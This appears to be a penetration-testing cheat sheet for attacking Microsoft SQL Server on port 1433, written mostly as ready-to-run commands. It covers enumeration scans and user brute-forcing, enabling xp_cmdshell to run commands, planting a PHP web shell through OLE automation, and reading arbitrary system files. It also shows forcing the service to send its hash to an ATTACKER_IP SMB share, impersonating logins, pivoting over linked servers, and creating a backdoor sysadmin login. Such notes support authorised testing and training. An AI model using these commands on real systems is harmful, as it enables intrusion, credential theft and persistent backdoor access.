# 1433 - MSSQL

### Service enumeration

#### Scan

```sh
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

#### Enumerate users

```shellscript
nxc mssql <IP> -u <USER> -p <PASSWORD> --rid-brute
```

#### Enumerate instances

```shellscript
https://github.com/NetSPI/PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLIstanceDomain
```

#### Service interaction

| Sans `--windows-auth`                                       | Avec `--windows-auth`                                                |
| ----------------------------------------------------------- | -------------------------------------------------------------------- |
| Utilise **SQL authentication**                              | Utilise **Windows authentication (NTLM)**                            |
| S'authentifie via le système SQL interne (`sys.sql_logins`) | S'authentifie via le contrôleur AD ou le SAM local                   |
| Nécessite que l'utilisateur existe **dans SQL Server**      | Nécessite que l'utilisateur ait des droits via Windows (AD ou local) |

```sh
# From Linux
impacket-mssqlclient -p 1433 <USER>:'<PASS>'@<IP>
impacket-mssqlclient -p 1433 <USER>:'<PASS>'@<IP> -windows-auth

# From Windows
https://github.com/NetSPI/PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLQuery -Verbose -Instance "<INSTANCE_IP>,1433" -username "<DOMAIN>\<USER>" -password "<PASS>" -query 'Select @@version'

sqlcmd -S <IP> -U <USER> -P '<PASS>' -y 30 -Y 30
```

#### Syntax

```sql
# List databases
SELECT name FROM master.dbo.sysdatabases;
enum_db

# Select database
USE <DB>;

# List tables
SELECT table_name FROM <DB>.INFORMATION_SCHEMA.TABLES;
```

### Command execution

```sh
enable_xp_cmdshell
xp_cmdshell <CMD>
```

### Write files

```sql
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

### Read files

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

### List directory content

```shellscript
xp_dirtree '<PATH>'
```

### Check if file exists

```shellscript
xp_fileexist '<PATH_TO_FILE>'
```

### Capture MSSQL Service Hash

We can force the `MSSQL` service to connect to our share and capture the service user hash

```sh
# Start the malicious SMB server
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support

# Forcing the service to try and retreive a file from our server
EXEC master..xp_dirtree '\\<ATTACKER_IP>\<SHARE>\'
EXEC master..xp_subdirs '\\<ATACKER_IP>\<SHARE>\'
EXEC xp_fileexist '\\<ATTACKER_IP>\<SHARE>\<FILE>'
```

### Impersonating existing users

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned

```sh
# List users who can be impersonated
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
enum_impersonate
nxc mssql <IP> -u <USER> -p <PASSWORD> -M enum_impersonate

# If we see a user we can impersonate
exec_as_login <USER>
```

### Communicate with trusted links

```sh
# Identify linked servers => 1 means remote server and 0 linked server
SELECT srvname, isremote FROM sysservers
enum_links 
nxc mssql <IP> -u <USER> -p <PASSWORD> -M enum_links

# Identify the user used for the connection and its privileges
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_SERVER>]

# Use the link 
use_link <LINK>
nxc mssql <IP> -u <USER> -p <PASSWORD> -M exec_on_link -o LINKED_SERVER=<SERVER> COMMAND='<COMMAND>'
```

### Add a new admin user

Can be useful if we have admin privileges, but can't enable `xp_cmdshell` for example

```sql
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

{% embed url="https://hackviser.com/tactics/pentesting/services/mssql#useful-tools" %}
